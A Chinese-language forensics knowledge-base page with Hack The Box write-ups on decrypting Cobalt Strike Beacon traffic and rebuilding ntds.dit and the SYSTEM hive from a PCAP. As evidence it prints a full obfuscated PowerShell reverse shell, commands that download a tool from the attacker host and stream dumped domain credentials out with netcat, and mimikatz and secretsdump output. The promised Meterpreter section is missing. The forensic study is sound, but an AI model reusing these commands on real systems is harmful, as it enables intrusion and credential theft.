---
title: 加密流量、内存密钥与文件重组
date: '2026-11-25 12:00:00'
updated: '2026-11-25 12:00:00'
lang: zh-CN
permalink: knowledge/forensics/
categories:
- 协议与取证
- 流量与内存
tags:
- 知识库
- PCAP
- AES
- Cobalt Strike
- HMAC
- WinRM
- NTLM
- 取证
- Meterpreter
- TLV
- RSA
description: 流量解密依赖包结构、会话状态和可验证的密钥材料。本章保留 Cobalt Strike、WinRM 与 Meterpreter 的原解析脚本，把提取、解密、导出和最终文件对应起来。
knowledge: true
copyright: true
toc:
  enable: true
  number: false
  max_depth: 2
---

流量解密依赖包结构、会话状态和可验证的密钥材料。本章保留 Cobalt Strike、WinRM 与 Meterpreter 的原解析脚本，把提取、解密、导出和最终文件对应起来。

<nav class="kb-tools" aria-label="章节操作">
<a href="/knowledge/">知识库目录</a>
<a href="/guide/">研究导读</a>
<a href="/knowledge/forensics/source.md" download>下载 Markdown</a>
<button type="button" data-expand-evidence>展开全部技术记录</button>
</nav>

<!--more-->

## 分析重点

Beacon 的 AES/HMAC 密钥通过 callback 验证，Meterpreter 另有 XOR 头和 TLV 结构。

WinRM 案例从多个 TCP 流重组账户材料，并记录 pyshark 字段兼容问题。

Response 的残缺 RSA 文件需要同时处理 Base64 对齐、整数参数与最终私钥验证。

## 案例与技术索引

| 分析入口 | 实验来源 | 技术点 |
| --- | --- | --- |
| [内存密钥与 Beacon 流量解析](#case-decrypt-cs-traffic) | decrypt-cs-traffic | PCAP、Cobalt Strike、AES、HMAC |
| [文件重组与 WinRM 解密](#case-decrypt-winrm-traffic) | decrypt-winrm-traffic | WinRM、PCAP、NTLM、取证 |
| [Meterpreter TLV 与破损 RSA 材料](#case-msf-meterpreter-traffic-decrypt) | msf-meterpreter-traffic-decrypt | Meterpreter、TLV、AES、RSA |

<a id="case-decrypt-cs-traffic"></a>

## 内存密钥与 Beacon 流量解析

原挑战将 PCAP 和进程内存对应起来，通过 callback 验证 AES 与 HMAC 密钥。后续保留解密、文件导出和会话证据。

<p class="kb-provenance">来源 decrypt-cs-traffic · 原记录 2022-01-05 · 8 个代码块 · 6 处图片引用</p>

<details class="kb-evidence" id="record-decrypt-cs-traffic">
<summary>查看分析过程、攻击步骤与完整代码</summary>

<!-- kb:start decrypt-cs-traffic -->

#### 介绍

本文记录 Hack The Box 取证挑战《Strike Back》的解题过程。



#### 分析pcap流量包和freesteam.dmp文件

使用Wireshark打开capture.pcap文件，发现第4到第10个数据包是freesteam.exe通过HTTP协议被下载到受害者机器上，然后按顺序点击File > Export Objects > HTTP，会打开一个窗口让我们轻松的将freesteam.exe文件从capture.pcap数据包中提取出来。

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/decrypt-cs-traffic.png)

``` bash
┌──(root💀kali)-[~/hackthebox/challenge/forensics/Strike_Back]
└─# file freesteam.exe
freesteam.exe: PE32 executable (GUI) Intel 80386 (stripped to external PDB), for MS Windows
```

将freesteam.exe上传到VirusTotal在线网站上，显示它是Cobalt Strike的木马程序

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/decrypt-cs-traffic1.png)

pcap中有很多的HTTP流量，但被加密了，所以现在转移到.dmp文件了。如果使用file命令，可以看到这是一个MiniDuMP崩溃dump。

``` bash
┌──(root💀kali)-[~/hackthebox/challenge/forensics/Strike_Back]
└─# file freesteam.dmp
freesteam.dmp: Mini DuMP crash report, 17 streams, Fri Nov 19 20:45:38 2021, 0x469925 type
```

通过使用radare2分析，可以确定这是一个freesteam.exe进程的dump。

``` bash
┌──(root💀kali)-[~/hackthebox/challenge/forensics/Strike_Back]
└─# r2 freesteam.dmp
[WARN] Invalid or unsupported enumeration encountered 21
[WARN] Invalid or unsupported enumeration encountered 22
[INFO] Parsing data sections for large dumps can take time, please be patient (but if strings ain't your thing try with -z)!
[0x02dd0000]> iSq~exe
0x400000 0x409000 ---- C:\Users\npatrick\Downloads\freesteam.exe
0x400000 0x409000 ---- C:\Users\npatrick\Downloads\freesteam.exe
```

通过搜索"Cobalt Strike memory dump"的变化，可以看到，它可能从freesteam.dmp的流量派生一个解密key，然后将该key应用到pcap文件。

#### 解密cs流量

从dump中提取密钥的方法会因cobalt strike beacon的版本而有所不同。在版本3中，key的前面是一组元数据字符串，除了false positives外，可以很容易提取。这种方法在这个例子中无效，所以假设这个example来自版本4。在本example中，提供了加密的callback，并且可以使用Didier Stevens编写的脚本来测试dump中针对该callback的所有可能的key。一旦成功，它将打印key，然后就可以解密流量了。Stevens的这篇blog详细介绍了这种方法：

 - [Quickpost: Decrypting Cobalt Strike Traffic](https://blog.didierstevens.com/2021/04/26/quickpost-decrypting-cobalt-strike-traffic/)

从76号数据包得到了加密callback, POST /submit.php?id=1909272864 HTTP/1.1。然后使用memory dump提取AES和HMAC key:

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/decrypt-cs-traffic2.png)

``` bash
00000040317639faf73648274ba8a66d11182283f7fa26fe44b3982a36d80f6ffba4949e5ec759fffb372775d2ac002425547a11ddf2e05c2cb914e09ac033f01db0b60c
```

解密脚本github地址:

 - [Beta](https://github.com/DidierStevens/Beta)

``` bash
┌──(root💀kali)-[~/hackthebox/challenge/forensics/Strike_Back]
└─# python3 /root/Beta/cs-extract-key.py -c 00000040317639faf73648274ba8a66d11182283f7fa26fe44b3982a36d80f6ffba4949e5ec759fffb372775d2ac002425547a11ddf2e05c2cb914e09ac033f01db0b60c freesteam.dmp
File: freesteam.dmp
Searching for AES and HMAC keys
Searching after sha256\x00 string (0x4048a)
AES key position: 0x00447f81
AES Key:  3ae7f995a2392c86e3fa8b6fbc3d953a
HMAC key position: 0x0044b2a1
HMAC Key: bf2d35c0e9b64bc46e6d513c1d0f6ffe
SHA256 raw key: bf2d35c0e9b64bc46e6d513c1d0f6ffe:3ae7f995a2392c86e3fa8b6fbc3d953a
Searching for raw key
Searching after sha256\x00 string (0x441a49)
AES key position: 0x00447f81
AES Key:  3ae7f995a2392c86e3fa8b6fbc3d953a
HMAC key position: 0x0044b2a1
HMAC Key: bf2d35c0e9b64bc46e6d513c1d0f6ffe
Searching for raw key
```

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/decrypt-cs-traffic3.png)

为了解密实际的pcap数据包，必须使用HMAC和AES key与另一个脚本，以获得以下结果:

``` bash
┌──(root💀kali)-[~/hackthebox/challenge/forensics/Strike_Back]
└─# python3 /root/Beta/cs-parse-http-traffic.py -k bf2d35c0e9b64bc46e6d513c1d0f6ffe:3ae7f995a2392c86e3fa8b6fbc3d953a capture.pcap -e 
Packet number: 12
HTTP response (for request 7 GET)
Length raw data: 14336
HMAC signature invalid
Packet number: 47
HTTP response (for request 23 GET)
Length raw data: 206401
HMAC signature invalid
Packet number: 69
HTTP response (for request 66 GET)
Length raw data: 48
Timestamp: 1637354721 20211119-204521
Data size: 8
Command: 27 GETUID
 Arguments length: 0

Packet number: 76
HTTP request POST
http://192.168.1.9/submit.php?id=1909272864
Length raw data: 68
Counter: 2
Callback: 16 BEACON_GETUID
b'WS02\\npatrick (admin)'

Packet number: 101
HTTP response (for request 86 GET)
Length raw data: 87648
Timestamp: 1637354781 20211119-204621
Data size: 87608
Command: 89 UNKNOWN
 Arguments length: 87552
 b'MZ\xe8\x00\x00\x00\x00[REU\x89\xe5\x81\xc3)\x1f\x00\x00\xff\xd3\x89\xc3Wh\x04\x00\x00\x00P\xff\xd0
 MD5: 1e4b88220d370c6bc55e213761f7b5ac
Command: 40 UNKNOWN
 Arguments length: 40
 Unknown1: 0
 Unknown2: 1602864
 Pipename: b'\\\\.\\pipe\\8e09448'
 Command: b'net user'
 b''

Packet number: 109
HTTP request POST
http://192.168.1.9/submit.php?id=1909272864
Length raw data: 724
Counter: 3
Callback: 24 BEACON_OUTPUT_NET
b"Account information for npatrick on \\\\localhost:\n\nUser name                    npatrick\nFull Name                    npatrick\nComment                      Fleet Commander\nUser's Comment               \nCountry code                 0\nAccount active               Yes\nAccount expires              Never\nAccount type                 Admin\n\nPassword last set            221 hours ago\nPassword expires             Yes\nPassword changeable          Yes\nPassword required            Yes\nUser may change password     Yes\n\nWorkstations allowed         \nLogon script                 \nUser profile                 \nHome directory               \nLast logon                   11/19/2021 12:41:23\n"

Packet number: 135
HTTP response (for request 119 GET)
Length raw data: 82528
Timestamp: 1637354843 20211119-204723
Data size: 82501
Command: 44 UNKNOWN
 Arguments length: 82432
 b'MZARUH\x89\xe5H\x81\xec \x00\x00\x00H\x8d\x1d\xea\xff\xff\xffH\x81\xc3T\x16\x00\x00\xff\xd3H\x89\x
 MD5: 851cbc5a118178f5c548e573a719d221
Command: 40 UNKNOWN
 Arguments length: 53
 Unknown1: 0
 Unknown2: 1391256
 Pipename: b'\\\\.\\pipe\\8a4f8bc8'
 Command: b'dump password hashes'
 b''

Packet number: 143
HTTP request POST
http://192.168.1.9/submit.php?id=1909272864
Length raw data: 548
Counter: 4
Callback: 21 BEACON_OUTPUT_HASHES
b'Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nDefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nGuest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nJohn Doe:1001:aad3b435b51404eeaad3b435b51404ee:37fbc1731f66ad4e524160a732410f9d:::\nnpatrick:1002:aad3b435b51404eeaad3b435b51404ee:3c7c8387d364a9c973dc51a235a1d0c8:::\nWDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:c81c8295ec4bfa3c9b90dcd6c64727e2:::\n'

Packet number: 190
HTTP response (for request 153 GET)
Length raw data: 438896
Timestamp: 1637354904 20211119-204824
Data size: 438866
Command: 44 UNKNOWN
 Arguments length: 438784
 b'MZARUH\x89\xe5H\x81\xec \x00\x00\x00H\x8d\x1d\xea\xff\xff\xffH\x81\xc3\xb8\x87\x00\x00\xff\xd3H\x8
 MD5: b0cfbef2bd9a171b3f48e088b8ae2a99
Command: 40 UNKNOWN
 Arguments length: 66
 Unknown1: 0
 Unknown2: 2112152
 Pipename: b'\\\\.\\pipe\\673dd5c0'
 Command: b'mimikatz sekurlsa::logonpasswords'
 b''

Packet number: 204
HTTP request POST
http://192.168.1.9/submit.php?id=1909272864
Length raw data: 4516
Counter: 5
Callback: 32 UNKNOWN

Authentication Id : 0 ; 334782 (00000000:00051bbe)
Session           : Interactive from 1
User Name         : npatrick
Domain            : WS02
Logon Server      : WS02
Logon Time        : 11/19/2021 12:40:19 PM
SID               : S-1-5-21-3301052303-2181805973-2384618940-1002
        msv :
         [00000003] Primary
         * Username : npatrick
         * Domain   : .
         * NTLM     : 3c7c8387d364a9c973dc51a235a1d0c8
         * SHA1     : 44cb46af6b1e8c5873bee400115d1694e650c5b4
        tspkg :
        wdigest :
         * Username : npatrick
         * Domain   : WS02
         * Password : (null)
        kerberos :
         * Username : npatrick
         * Domain   : WS02
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 334736 (00000000:00051b90)
Session           : Interactive from 1
User Name         : npatrick
Domain            : WS02
Logon Server      : WS02
Logon Time        : 11/19/2021 12:40:19 PM
SID               : S-1-5-21-3301052303-2181805973-2384618940-1002
        msv :
         [00000003] Primary
         * Username : npatrick
         * Domain   : .
         * NTLM     : 3c7c8387d364a9c973dc51a235a1d0c8
         * SHA1     : 44cb46af6b1e8c5873bee400115d1694e650c5b4
        tspkg :
        wdigest :
         * Username : npatrick
         * Domain   : WS02
         * Password : (null)
        kerberos :
         * Username : npatrick
         * Domain   : WS02
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 997 (00000000:000003e5)
Session           : Service from 0
User Name         : LOCAL SERVICE
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 11/19/2021 12:40:12 PM
SID               : S-1-5-19
        msv :
        tspkg :
        wdigest :
         * Username : (null)
         * Domain   : (null)
         * Password : (null)
        kerberos :
         * Username : (null)
         * Domain   : (null)
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 46420 (00000000:0000b554)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 11/19/2021 12:40:12 PM
SID               : S-1-5-90-0-1
        msv :
        tspkg :
        wdigest :
         * Username : WS02$
         * Domain   : WORKGROUP
         * Password : (null)
        kerberos :
        ssp :
        credman :

Authentication Id : 0 ; 46226 (00000000:0000b492)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 11/19/2021 12:40:12 PM
SID               : S-1-5-90-0-1
        msv :
        tspkg :
        wdigest :
         * Username : WS02$
         * Domain   : WORKGROUP
         * Password : (null)
        kerberos :
        ssp :
        credman :

Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : WS02$
Domain            : WORKGROUP
Logon Server      : (null)
Logon Time        : 11/19/2021 12:40:12 PM
SID               : S-1-5-20
        msv :
        tspkg :
        wdigest :
         * Username : WS02$
         * Domain   : WORKGROUP
         * Password : (null)
        kerberos :
         * Username : ws02$
         * Domain   : WORKGROUP
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 26445 (00000000:0000674d)
Session           : Interactive from 0
User Name         : UMFD-0
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 11/19/2021 12:40:12 PM
SID               : S-1-5-96-0-0
        msv :
        tspkg :
        wdigest :
         * Username : WS02$
         * Domain   : WORKGROUP
         * Password : (null)
        kerberos :
        ssp :
        credman :

Authentication Id : 0 ; 26411 (00000000:0000672b)
Session           : Interactive from 1
User Name         : UMFD-1
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 11/19/2021 12:40:12 PM
SID               : S-1-5-96-0-1
        msv :
        tspkg :
        wdigest :
         * Username : WS02$
         * Domain   : WORKGROUP
         * Password : (null)
        kerberos :
        ssp :
        credman :

Authentication Id : 0 ; 25289 (00000000:000062c9)
Session           : UndefinedLogonType from 0
User Name         : (null)
Domain            : (null)
Logon Server      : (null)
Logon Time        : 11/19/2021 12:40:12 PM
SID               : 
        msv :
        tspkg :
        wdigest :
        kerberos :
        ssp :
        credman :

Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : WS02$
Domain            : WORKGROUP
Logon Server      : (null)
Logon Time        : 11/19/2021 12:40:12 PM
SID               : S-1-5-18
        msv :
        tspkg :
        wdigest :
         * Username : WS02$
         * Domain   : WORKGROUP
         * Password : (null)
        kerberos :
         * Username : ws02$
         * Domain   : WORKGROUP
         * Password : (null)
        ssp :
        credman :

Extra packet data: b'\x00\x00\x00'

Packet number: 217
HTTP response (for request 214 GET)
Length raw data: 80
Timestamp: 1637354965 20211119-204925
Data size: 43
Command: 53 LIST_FILES
 Arguments length: 35
 b'\xff\xff\xff\xfe\x00\x00\x00\x1bC:\\Users\\npatrick\\Desktop\\*'
 MD5: 2211925feba04566b12e81807ff9c0b4

Packet number: 224
HTTP request POST
http://192.168.1.9/submit.php?id=1909272864
Length raw data: 324
Counter: 6
Callback: 22 TODO
b'\xff\xff\xff\xfe'
----------------------------------------------------------------------------------------------------
C:\Users\npatrick\Desktop\*
D       0       11/19/2021 12:24:08     .
D       0       11/19/2021 12:24:08     ..
F       5175    11/11/2021 03:24:13     cheap_spare_parts_for_old_blimps.docx
F       282     11/10/2021 07:02:24     desktop.ini
F       24704   11/11/2021 03:22:16     gogglestown_citizens_osint.xlsx
F       62393   11/19/2021 12:24:10     orders.pdf

----------------------------------------------------------------------------------------------------

Packet number: 237
HTTP response (for request 234 GET)
Length raw data: 80
Timestamp: 1637355025 20211119-205025
Data size: 44
Command: 11 DOWNLOAD
 Arguments length: 36
 b'C:\\Users\\npatrick\\Desktop\\orders.pdf'
 MD5: b25952a4fd6a97bac3ccc8f2c01b906b

Packet number: 254
HTTP request POST
http://192.168.1.9/submit.php?id=1909272864
Length raw data: 62572
Counter: 7
Callback: 2 DOWNLOAD_START
 parameter1: 0
 length: 62393
 filenameDownload: C:\Users\npatrick\Desktop\orders.pdf

Counter: 8
Callback: 8 DOWNLOAD_WRITE
 Length: 62393
 MD5: 00f542efefccd7a89a55c133180d8581

Counter: 9
Callback: 9 DOWNLOAD_COMPLETE
b'\x00\x00\x00\x00'


Commands summary:
 11 DOWNLOAD: 1
 27 GETUID: 1
 40 UNKNOWN: 3
 44 UNKNOWN: 2
 53 LIST_FILES: 1
 89 UNKNOWN: 1

Callbacks summary:
 2 DOWNLOAD_START: 1
 8 DOWNLOAD_WRITE: 1
 9 DOWNLOAD_COMPLETE: 1
 16 BEACON_GETUID: 1
 21 BEACON_OUTPUT_HASHES: 1
 22 TODO: 1
 24 BEACON_OUTPUT_NET: 1
 32 UNKNOWN: 1
```

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/decrypt-cs-traffic4.png)

使用"--help"运行解密脚本，使用-e参数可以将文件解压缩到磁盘。通过这个命令，会打印出相同的结果，但同时还向当前目录添加了几个.vir文件。file命令显示有几个DLL文件、一个ASCII文本文件和一个pdf文件。

``` bash
┌──(root💀kali)-[~/hackthebox/challenge/forensics/Strike_Back]
└─# ls
capture.pcap   payload-00f542efefccd7a89a55c133180d8581.vir  payload-851cbc5a118178f5c548e573a719d221.vir
freesteam.dmp  payload-1e4b88220d370c6bc55e213761f7b5ac.vir  payload-b0cfbef2bd9a171b3f48e088b8ae2a99.vir
freesteam.exe  payload-2211925feba04566b12e81807ff9c0b4.vir  payload-b25952a4fd6a97bac3ccc8f2c01b906b.vir
                                                                                                                                    
┌──(root💀kali)-[~/hackthebox/challenge/forensics/Strike_Back]
└─# file *.vir
payload-00f542efefccd7a89a55c133180d8581.vir: PDF document, version 1.4, 1 pages
payload-1e4b88220d370c6bc55e213761f7b5ac.vir: PE32 executable (DLL) (GUI) Intel 80386, for MS Windows
payload-851cbc5a118178f5c548e573a719d221.vir: PE32+ executable (DLL) (GUI) x86-64, for MS Windows
payload-2211925feba04566b12e81807ff9c0b4.vir: data
payload-b0cfbef2bd9a171b3f48e088b8ae2a99.vir: MS-DOS executable PE32+ executable (DLL) (console) x86-64, for MS Windows
payload-b25952a4fd6a97bac3ccc8f2c01b906b.vir: ASCII text, with no line terminators
```

得到flag，cs流量解密成功:

``` bash
HTB{Th4nk_g0d_y0u_f0und_1t_0n_T1m3!!!!}
```

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/decrypt-cs-traffic5.png)

<!-- kb:end decrypt-cs-traffic -->

</details>

<a id="case-decrypt-winrm-traffic"></a>

## 文件重组与 WinRM 解密

先按 TCP 流提取 Base64 传输的 NTDS 和 SYSTEM，再还原账户材料与 WinRM 会话。pyshark 字段差异及脚本修订属于复现要点。

<p class="kb-provenance">来源 decrypt-winrm-traffic · 原记录 2022-01-05 · 8 个代码块 · 10 处图片引用</p>

<details class="kb-evidence" id="record-decrypt-winrm-traffic">
<summary>查看分析过程、攻击步骤与完整代码</summary>

<!-- kb:start decrypt-winrm-traffic -->

#### 介绍

本文记录 Hack The Box 取证挑战《Keep the steam going》的解题过程。



#### 分析pcap数据包

使用"tcp.stream eq 20"在wireshark中过滤数据包，发现一个powershell写的reverse shell，并且混淆过

``` bash
sv ('8mxc'+'p')  ([tyPe]("{1}{0}{2}" -f 't.encOdi','tex','nG') ) ;${ClI`E`Nt} = &("{1}{0}{2}"-f 'je','New-Ob','ct') ("{5}{0}{8}{1}{2}{3}{4}{6}{7}" -f'y','m','.Net.So','ckets.T','C','S','PC','lient','ste')(("{0}{1}{2}" -f '192.168','.1','.9'),4443);${sT`Re`Am} = ${C`L`IeNT}.("{0}{2}{1}"-f'Ge','tream','tS').Invoke();[byte[]]${By`T`es} = 0..65535|.('%'){0};while((${i} = ${str`EaM}.("{0}{1}" -f'Re','ad').Invoke(${bY`Tes}, 0, ${by`TEs}."Len`G`TH")) -ne 0){;${d`AtA} = (.("{2}{1}{0}"-f '-Object','w','Ne') -TypeName ("{0}{3}{5}{1}{4}{2}" -f'Syst','ASCI','g','em.Text','IEncodin','.'))."gETSt`R`i`Ng"(${by`TES},0, ${i});${SeN`DBacK} = (.("{0}{1}"-f 'ie','x') ${Da`Ta} 2>&1 | &("{0}{2}{1}"-f'Out-','ing','Str') );${SENdb`AC`k2} = ${s`eNDb`ACK} + "PS " + (.("{1}{0}"-f'd','pw'))."P`ATH" + "> ";${sE`NDBYtE} = (  (  vaRIaBle ('8MXC'+'P')  -ValUe  )::"ASC`Ii").("{2}{1}{0}"-f'es','tByt','Ge').Invoke(${SENdB`AC`K2});${sT`REAM}.("{0}{1}" -f'Writ','e').Invoke(${S`e`NdbY`Te},0,${SE`NDbyTe}."lENG`TH");${S`TR`eAM}.("{1}{0}" -f 'h','Flus').Invoke()};${clIE`Nt}.("{0}{1}"-f 'Cl','ose').Invoke()
```

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/decrypt-winrm-traffic.png)

使用"tcp.stream eq 21"在wireshark中过滤数据包，发现攻击者以smith用户获取reverse shell后，执行命令dump ntds.dit和SYSTEM hive文件

``` bash
PS C:\> whoami;hostname
corp\asmith
corp-dc
PS C:\> ntdsutil "ac i ntds" "ifm" "create full c:\temp" q q
C:\Windows\system32\ntdsutil.exe: ac i ntds
Active instance set to "ntds".
C:\Windows\system32\ntdsutil.exe: ifm
ifm: create full c:\temp
Creating snapshot...
Snapshot set {7f610e6f-46fe-4e74-9cc9-baa92f19f67a} generated successfully.
Snapshot {710fb56f-b795-44ef-b88a-d25aa3026d36} mounted as C:\$SNAP_202111051500_VOLUMEC$\
Snapshot {710fb56f-b795-44ef-b88a-d25aa3026d36} is already mounted.
Initiating DEFRAGMENTATION mode...
     Source Database: C:\$SNAP_202111051500_VOLUMEC$\Windows\NTDS\ntds.dit
     Target Database: c:\temp\Active Directory\ntds.dit

                  Defragmentation  Status (omplete)

          0    10   20   30   40   50   60   70   80   90  100
          |----|----|----|----|----|----|----|----|----|----|
          ...................................................

Copying registry files...
Copying c:\temp\registry\SYSTEM
Copying c:\temp\registry\SECURITY
Snapshot {710fb56f-b795-44ef-b88a-d25aa3026d36} unmounted.
IFM media created successfully in c:\temp
ifm: q
C:\Windows\system32\ntdsutil.exe: q
PS C:\> iex (New-Object System.Net.WebClient).DownloadFile("http://192.168.1.9/n.exe","C:\Users\Public\Music\n.exe")
PS C:\> certutil -encode "C:\temp\Active Directory\ntds.dit" "C:\temp\ntds.b64"
Input Length = 33554432
Output Length = 46137402
CertUtil: -encode command completed successfully.
PS C:\> certutil -encode "C:\temp\REGISTRY\SYSTEM" "C:\temp\system.b64"
Input Length = 15204352
Output Length = 20906044
CertUtil: -encode command completed successfully.
PS C:\> cat C:\temp\ntds.b64 | C:\Users\Public\Music\n.exe 192.168.1.9 8080
PS C:\> cat C:\temp\system.b64 | C:\Users\Public\Music\n.exe 192.168.1.9 8080
PS C:\> 
```

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/decrypt-winrm-traffic1.png)

使用"tcp.stream eq 23"在wireshark中过滤数据包，发现攻击者使用netcat传输ntds.dit文件，并且经过了base64加密

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/decrypt-winrm-traffic2.png)

保存为ntds.dit.b64，并去掉开头的"-----BEGIN CERTIFICATE-----"和结尾的"-----END CERTIFICATE-----",然后使用下列命令解密还原为原文件

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/decrypt-winrm-traffic3.png)

``` bash
┌──(root💀kali)-[~/hackthebox/challenge/forensics/forensics_keep_the_steam]
└─# base64 --decode ntds.dit.b64 > ntds.dit
                                                                                                                                    
┌──(root💀kali)-[~/hackthebox/challenge/forensics/forensics_keep_the_steam]
└─# file ntds.dit     
ntds.dit: Extensible storage engine DataBase, version 0x620, checksum 0xe3a0f73e, page size 8192, Windows version 10.0
```

使用"tcp.stream eq 24"在wireshark中过滤数据包，发现攻击者使用netcat传输system.hive文件，并且经过了base64加密

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/decrypt-winrm-traffic4.png)

保存为system.b64，并去掉开头的"-----BEGIN CERTIFICATE-----"和结尾的"-----END CERTIFICATE-----",然后使用下列命令解密还原为原文件

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/decrypt-winrm-traffic5.png)

``` bash
┌──(root💀kali)-[~/hackthebox/challenge/forensics/forensics_keep_the_steam]
└─# base64 --decode system.b64 > system.hive
                                                                                                                                    
┌──(root💀kali)-[~/hackthebox/challenge/forensics/forensics_keep_the_steam]
└─# file system.hive 
system.hive: MS Windows registry file, NT/2000 or above
```

#### dump NTLM Hashes

显然，ntds.dit和system.hive中都包含大量信息，所以决定把重点放在如果同时利用这两个文件，看看能得到什么。发现为了为域用户提取NTLM hash，从系统中获取这些文件是一种相当常见的策略。Impacket有一个名为secretsdump.py的脚本可以自动提取这些哈希值; Kali Linux已经有了这个脚本，但也可以从github直接下载它

 - [secretsdump.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py)

dump hash的实际命令相对简单，就像解析results的过程一样:

``` bash
┌──(root💀kali)-[~/hackthebox/challenge/forensics/forensics_keep_the_steam]
└─# secretsdump.py -ntds ntds.dit -system system.hive LOCAL
Impacket v0.9.25.dev1+20211027.123255.1dad8f7f - Copyright 2021 SecureAuth Corporation

[*] Target system bootKey: 0x406124541b22fb571fb552e27e956557
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 9da98598be012bc4a476100a50a63409
[*] Reading and decrypting hashes from ntds.dit 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:8bb1f8635e5708eb95aedf142054fc95:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
CORP-DC$:1000:aad3b435b51404eeaad3b435b51404ee:94d5e7460c75a0b30d85744f633a0e66:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:9555398600e2b2edf220d06a7c564e6f:::
CORP.local\fcastle:1103:aad3b435b51404eeaad3b435b51404ee:37fbc1731f66ad4e524160a732410f9d:::
CORP.local\jdoe:1104:aad3b435b51404eeaad3b435b51404ee:37fbc1731f66ad4e524160a732410f9d:::
WS01$:1105:aad3b435b51404eeaad3b435b51404ee:cd9c49cc4a1a535d27b64ab23d58f3e6:::
WS02$:1106:aad3b435b51404eeaad3b435b51404ee:98c3974cacc09721a351361504de4de5:::
CORP.local\asmith:1109:aad3b435b51404eeaad3b435b51404ee:acbfc03df96e93cf7294a01a6abbda33:::
[*] Kerberos keys from ntds.dit 
Administrator:aes256-cts-hmac-sha1-96:6e5d1ccb7642b4bf855975702699f733034916dbd04bf4acddc36ac273b3f578
Administrator:aes128-cts-hmac-sha1-96:8d5709c4a7cab2e0f5fbb4a069b283fb
Administrator:des-cbc-md5:e302c7793b58ae97
CORP-DC$:aes256-cts-hmac-sha1-96:9c888129432a87257f81f6bb6affd91bc3b0ba9cf20e94ef9216364d79aab5bd
CORP-DC$:aes128-cts-hmac-sha1-96:0ac3c714050469724e5c41d21f7f86d3
CORP-DC$:des-cbc-md5:57497ce6972613da
krbtgt:aes256-cts-hmac-sha1-96:85c670ece27dad635c28630454154bb325b644b8f61d44f802b80c39277f529e
krbtgt:aes128-cts-hmac-sha1-96:15bfbb6b827c1904e49d77bf7624c2f4
krbtgt:des-cbc-md5:a2074373b920515d
CORP.local\fcastle:aes256-cts-hmac-sha1-96:c6319d38d781e145161c4b1a4ef11d08ad9be36c43b173b355f78c2cf2edf15a
CORP.local\fcastle:aes128-cts-hmac-sha1-96:144565c25d70678535b2908983d74f6e
CORP.local\fcastle:des-cbc-md5:6b0b2f01a731a78f
CORP.local\jdoe:aes256-cts-hmac-sha1-96:9d74074381d0000525c1cfbb24c2943e28bf415b89c8cf958eae5add39614ac8
CORP.local\jdoe:aes128-cts-hmac-sha1-96:7e0fb5fa7dcfa50ea0a8a55e08b63f74
CORP.local\jdoe:des-cbc-md5:610e67019e9b68ab
WS01$:aes256-cts-hmac-sha1-96:ccc215ff3ac06dc3e206f6e55cd1512f3bb00311d02c77591f3cb08e01d5a40f
WS01$:aes128-cts-hmac-sha1-96:5e94401d7da953a13d42809340ff6ec3
WS01$:des-cbc-md5:9885ea642f268ab3
WS02$:aes256-cts-hmac-sha1-96:dc3f081be6c29532904a073124a0998d857667cc5c531fcbe0f6d3e46d40eac2
WS02$:aes128-cts-hmac-sha1-96:7e494ea36b4fb80670f807a8c72e7b3d
WS02$:des-cbc-md5:b58a08dc9eabbc0d
CORP.local\asmith:aes256-cts-hmac-sha1-96:57e22c0b740ed35935f82a6e34ab84a683437105a4ab2f1f3ba70962d5c53112
CORP.local\asmith:aes128-cts-hmac-sha1-96:392a638579d925cca9e4ef7965b9dcdd
CORP.local\asmith:des-cbc-md5:839bd6e9380e40f7
[*] Cleaning up...
```

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/decrypt-winrm-traffic6.png)

#### 解密winrm流量

当在base64编码的SYSTEM hive通过端口8080完成传输后立即查看流量时，可以看到加密的winrm流量，可以通过解密winrm流量来查看最后的flag。

``` bash
tcp.stream eq 25
```

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/decrypt-winrm-traffic7.png)

